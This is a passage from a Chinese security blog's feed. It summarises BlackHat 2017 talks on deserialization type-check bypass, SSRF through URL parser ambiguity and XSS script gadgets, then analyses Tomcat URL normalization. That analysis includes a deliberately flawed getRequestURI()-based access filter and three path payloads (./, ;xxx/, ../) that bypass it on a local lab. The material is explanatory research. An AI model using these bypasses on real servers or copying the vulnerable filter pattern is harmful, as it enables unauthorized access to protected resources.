title="FlexSON"></a>FlexSON</h4><p>默认配置下就支持动态类型的反序列化，并且没有类型检查。</p><p><strong>同样，FlexSON反序列化过程中会调用被反序列化类的setter方法。</strong></p><h3 id="对类型检查防御的Bypass思路"><a href="#对类型检查防御的Bypass思路" class="headerlink" title="对类型检查防御的Bypass思路"></a>对类型检查防御的Bypass思路</h3><p>一些库做类型检查的方式是探测（inspect）将要反序列化的类型的对象图（得到其所有field及其类型），仅允许与成员变量的类型匹配（assignable）的赋值。</p><p><strong>此时若想实现RCE，需要找到对象图上的一个入口点，这个点仍能指定为Gadget类型。</strong></p><p>比如：</p><ul><li>若对象图中有成员变量是java.lang.Object类型或者泛型类型（如<code>Message&lt;T&gt;</code>），那么可以将其当做入口点；</li><li>若对象图中有成员变量的类型是T，T的子类中有成员变量是Object类型。比如java.lang.Exception的子类javax.management.InvalidApplicationException；</li></ul><p>注意：Jackson、Fastjson是使用黑名单禁止反序列化Gadgets类的，这种只能通过新Gadget来Bypass。</p><h2 id="0x04-A-NEW-ERA-OF-SSRF-EXPLOITING-URL-PARSER-IN-TRENDING-PROGRAMMING-LANGUAGES-（利用URL解析器进行SSRF攻击）"><a href="#0x04-A-NEW-ERA-OF-SSRF-EXPLOITING-URL-PARSER-IN-TRENDING-PROGRAMMING-LANGUAGES-（利用URL解析器进行SSRF攻击）" class="headerlink" title="0x04 A NEW ERA OF SSRF - EXPLOITING URL PARSER IN TRENDING PROGRAMMING LANGUAGES!（利用URL解析器进行SSRF攻击）"></a>0x04 A NEW ERA OF SSRF - EXPLOITING URL PARSER IN TRENDING PROGRAMMING LANGUAGES!（利用URL解析器进行SSRF攻击）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>议题的重点是Protocol Smuggling，主要是HTTP请求走私。</p><p>作者展示了Python、PHP、Curl中各个Library对特殊形式HTTP请求处理的差异，并利用这些差异实现SSRF。</p><p>出现该问题的原因在于，HTTP URI的标准有处理建议，但并非强制要求，并且对不符合标准结构的特殊情况没有规定如何处理，因此不同的库都会有自己的实现方式。</p><p>因此，协议走私可以简单理解为二义性问题，即特殊形式的请求报文在不同的解析器下有不同的理解，这种差异结果可被攻击者利用来绕过安全检查或者实现某种攻击如SSRF等。</p><h3 id="基本概念与原理"><a href="#基本概念与原理" class="headerlink" title="基本概念与原理"></a>基本概念与原理</h3><p>作者对于本议题的研究灵感来源于<code>CVE-2016-8624：invalid URL parsing with &#39;#&#39;</code>。</p><p>作者对所有语言的Library进行了测试，各个库的处理情况如下：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/15.png" alt=""></p><p>注意：Port注入类似<code>http://127.0.0.1:12345:80</code>；Host注入类似<code>http://a.com#@evil.com</code>；Path注入类似<code>http://a.com/test/../info</code>等。</p><p>利用这种解析的二义性，就能进行如SSRF的攻击。</p><h3 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h3><h4 id="SNI注入"><a href="#SNI注入" class="headerlink" title="SNI注入"></a>SNI注入</h4><p>SNI（Server Name Indication，服务器名称指示）定义在RFC 4366，是一项用于改善SSL/TLS的技术，在SSLv3/TLSv1中被启用。它允许客户端发起SSL握手请求时（具体说是客户端发出SSL请求中的ClientHello阶段）就提交请求的Host信息，使得服务器能够切换到正确的域并返回对应的证书。</p><p>注意：SNI是明文传输。</p><p>因此，HTTPS的SNI存在Host头一样的走私方法，如下图CRLF注入：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/17.png" alt=""></p><h4 id="Node-JS"><a href="#Node-JS" class="headerlink" title="Node.JS"></a>Node.JS</h4><p>大写N（U+FF2E）的宽字节形式可以代替<code>..</code>使用。</p><p>Unicode字符<code>U+FF0D U+FF0A</code>可以作为CRLF字符使用。</p><h4 id="glibc-NSS特性"><a href="#glibc-NSS特性" class="headerlink" title="glibc NSS特性"></a>glibc NSS特性</h4><p>gethostbyname()支持十进制数表示Hsot。</p><p>Linux getaddrinfo()会忽略Host中空格之后的内容，很多库的实现依赖该函数，而有些库会进行两次URL解码。</p><p>HTTPConnection.puthreader()禁止CRLF后面的空白，但可以在前面加上空白来绕过。这可以绕过Python CVE-2016-5699补丁的限制。</p><h4 id="遵循的标准不同"><a href="#遵循的标准不同" class="headerlink" title="遵循的标准不同"></a>遵循的标准不同</h4><p>URL parser和URL requester遵循的IDNA标准不同时也会导致解析差异。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/16.png" alt=""></p><h2 id="0x05-DON’T-TRUST-THE-DOM-BYPASSING-XSS-MITIGATIONS-VIA-SCRIPT-GADGETS（利用Script-Gadgets绕过XSS缓解措施）"><a href="#0x05-DON’T-TRUST-THE-DOM-BYPASSING-XSS-MITIGATIONS-VIA-SCRIPT-GADGETS（利用Script-Gadgets绕过XSS缓解措施）" class="headerlink" title="0x05 DON’T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS（利用Script Gadgets绕过XSS缓解措施）"></a>0x05 DON’T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS（利用Script Gadgets绕过XSS缓解措施）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p><h3 id="基本概念与原理-1"><a href="#基本概念与原理-1" class="headerlink" title="基本概念与原理"></a>基本概念与原理</h3><p>XSS Mitigation即XSS缓解措施，该机制是通过识别并阻止恶意的标签或属性来缓解XSS攻击。常见的XSS MITIGATIONS机制有浏览器的CSP机制、XSS Auditor、XSS Filter、WAF的过滤器等。</p><p>当今Web应用都普遍使用JavaScript框架，而JavaScript框架通常是用到了DOM操纵技术，即从DOM中读取数据、修改DOM的结构等。在实现上是使用selector（选择器），通过某种形式的语法来选取DOM中特定的单个或多个标签，来读写器属性或文本。</p><p>那么是否可以通过JS框架的script来绕过XSS Mitigation机制呢？——使用Script Gadget来绕过。</p><p>什么是Script Gadget？——简单地说，Script Gadget就是在当前页面中可被利用来绕过XSS Mitigation机制的JS代码。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/19.png" alt=""></p><p>页面上通过selector读取标签属性的JS脚本片段，使用了会导致脚本执行的API（比如上图的html()）来处理读取的数据。这里注入的XSS数据时一段HTML代码，没有script和on事件等恶意标签或属性，恶意脚本藏在data-text的值中，且该值不受XSS Mitigation机制的限制；当经过正文JS脚本中selector的处理后，data-text的值就被放入buttons.html() API中使用，进而放入DOM中导致恶意脚本被执行。这整个过程就是使用无害的JS库的API来绕过XSS Mitigation机制的。</p><p>注意：注入的数据经过了HTML编码，但是仍然能够执行XSS，这是因为注入的内容在div标签中，会先被HTML解析器进行HTML解码。</p><p>针对Gadgets的研究，作者做了充分的实验测试，具体的可参考PDF连接文档。</p><p>具体的Script Gadget PoC都在：<a href="https://github.com/google/security-research-pocs" target="_blank" rel="noopener">https://github.com/google/security-research-pocs</a></p><h3 id="研究结论"><a href="#研究结论" class="headerlink" title="研究结论"></a>研究结论</h3><p>除了React库外，其他库都存在Script Gadget可以绕过特定的XSS Mitigation，其中Emberjs仅在开发者版本中存在绕过风险：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/18.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>（先知首发）Tomcat URL解析差异性导致的安全问题</title>
    <link href="https://www.mi1k7ea.com/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/01/Tomcat-URL解析差异性及利用/</id>
    <published>2020-04-01T15:47:17.000Z</published>
    <updated>2020-04-22T15:41:47.477Z</updated>
    
    <content type="html"><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p><p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p><h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" title="HttpServletRequest中几个解析URL的函数"></a>HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p><ul><li>request.getRequestURL()：返回全路径；</li><li>request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li><li>request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li><li>request.getServletPath()：返回除去Host和工程名部分的路径；</li><li>request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li></ul><p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p><table><thead><tr><th>函数</th><th>URL解码</th><th>解析结构</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><h3 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h3><p>新建一个Java Web项目，index.jsp如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h4><p>Tomcat运行之后，正常访问<code>http://localhost:8080/urltest/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/1.png" alt=""></p><h4 id="插入-访问"><a href="#插入-访问" class="headerlink" title="插入 ./ 访问"></a>插入 ./ 访问</h4><p>尝试插入多个<code>./</code>访问即<code>http://localhost:8080/urltest/./././index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/2.png" alt=""></p><p>可以看到，插入多个<code>./</code>也能正常访问。</p><p>接着尝试这种形式<code>http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp</code>，发现是返回404，未找到该资源访问：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/3.png" alt=""></p><h4 id="插入-访问-1"><a href="#插入-访问-1" class="headerlink" title="插入 ../ 访问"></a>插入 ../ 访问</h4><p>尝试插入<code>../</code>访问即<code>http://localhost:8080/urltest/../index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/4.png" alt=""></p><p>可以是返回的404，这是因为实际访问的是<code>http://localhost:8080/index.jsp</code>，这个目录文件当然不存在。</p><p>换种跨目录的形式就OK了<code>http://localhost:8080/urltest/noexist/../index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/5.png" alt=""></p><h4 id="插入-访问-2"><a href="#插入-访问-2" class="headerlink" title="插入 ;/ 访问"></a>插入 ;/ 访问</h4><p>尝试插入多个<code>;/</code>访问即<code>http://localhost:8080/urltest/;/;/;/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/6.png" alt=""></p><p>可以看到，插入多个<code>;</code>也能正常访问。</p><p>在<code>;</code>号后面加上字符串也是能正常访问的，如<code>http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/7.png" alt=""></p><h4 id="插入其他特殊字符访问"><a href="#插入其他特殊字符访问" class="headerlink" title="插入其他特殊字符访问"></a>插入其他特殊字符访问</h4><p>尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &apos; &quot; &lt; &gt; ?</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>由前面的尝试知道，Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。</p><h3 id="Tomcat对URL特殊字符的处理"><a href="#Tomcat对URL特殊字符的处理" class="headerlink" title="Tomcat对URL特殊字符的处理"></a>Tomcat对URL特殊字符的处理</h3><p>这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。</p><p>经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service:452, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:1195, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/8.png" alt=""></p><p>跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/9.png" alt=""></p><p>这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在<code>;</code>号，找到的话才会进入下面的if代码逻辑：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/10.png" alt=""></p><p>如果找到了<code>;</code>号，在if代码逻辑中后面的循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问<code>http://localhost:8080/urltest/;mi1k7ea/index.jsp</code>再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是<code>;</code>，47是<code>/</code>）：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/11.png" alt=""></p><p>由此可知，parsePathParameters()函数是对<code>;xxx/</code>这种形式进行处理的。</p><p>接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。</p><p>先看到这段代码，ASCII码92表示<code>\</code>，当匹配到时将其替换为ASCII码为47的<code>/</code>；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/12.png" alt=""></p><p>往下是这段循环，判断是否有连续的<code>/</code>，存在的话则循环删除掉多余的<code>/</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/13.png" alt=""></p><p>接着往下看，这段循环就是对<code>./</code>和<code>../</code>这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/14.png" alt=""></p><p>这里尝试下添加<code>/./</code>访问的处理，看到找到之后是直接将其去掉然后继续放行：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/15.png" alt=""></p><p>这里尝试下添加<code>/../</code>访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/16.png" alt=""></p><p>由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过<code>;xxx/</code>的URL请求内容进标准化处理，具体为将连续的多个<code>/</code>给删除掉只保留一个、将<code>/./</code>删除掉、将<code>/../</code>进行跨目录拼接处理，最后返回处理后的URL路径。</p><p><strong>结论</strong></p><p>Tomcat对<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理。</p><h3 id="getRequestURI-的处理"><a href="#getRequestURI-的处理" class="headerlink" title="getRequestURI()的处理"></a>getRequestURI()的处理</h3><p>我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。</p><p>这里是直接调用Request.requestURI()函数然后直接返回其字符串值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/19.png" alt=""></p><p>跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/20.png" alt=""></p><h3 id="getRequestURL-的处理"><a href="#getRequestURL-的处理" class="headerlink" title="getRequestURL()的处理"></a>getRequestURL()的处理</h3><p>在getRequestURL()函数中是调用了Request.getRequestURL()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/24.png" alt=""></p><p>跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/25.png" alt=""></p><h3 id="getServletPath-的处理"><a href="#getServletPath-的处理" class="headerlink" title="getServletPath()的处理"></a>getServletPath()的处理</h3><p>在getServletPath()函数中是调用了Request.getServletPath()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/21.png" alt=""></p><p>跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/22.png" alt=""></p><h3 id="getPathInfo-的处理"><a href="#getPathInfo-的处理" class="headerlink" title="getPathInfo()的处理"></a>getPathInfo()的处理</h3><p>和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/23.png" alt=""></p><h3 id="getContextPath-的处理"><a href="#getContextPath-的处理" class="headerlink" title="getContextPath()的处理"></a>getContextPath()的处理</h3><p>在getContextPath()函数中，调用了Request.getContextPath()函数：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/26.png" alt=""></p><p>跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/27.png" alt=""></p><p>往下的这段循环是处理uri变量值中如果存在多个连续的<code>/</code>则删除掉：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/28.png" alt=""></p><p>再往下，获取下一个<code>/</code>符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/29.png" alt=""></p><p>接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理<code>;</code>和<code>.</code>，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/30.png" alt=""></p><p>最后，直接返回按pos索引切分的uri变量值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/31.png" alt=""></p><h2 id="0x04-攻击利用"><a href="#0x04-攻击利用" class="headerlink" title="0x04 攻击利用"></a>0x04 攻击利用</h2><p>看个访问限制绕过的场景。</p><p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">username: mi1k7ea&lt;br&gt;</span><br><span class="line">password: <span class="number">123456</span>&lt;br&gt;</span><br><span class="line">address: china&lt;br&gt;</span><br><span class="line">phone: <span class="number">13666666666</span>&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p><p>编辑web.xml，添加testFilter设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.testFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/17.png" alt=""></p><p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/./info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/18.png" 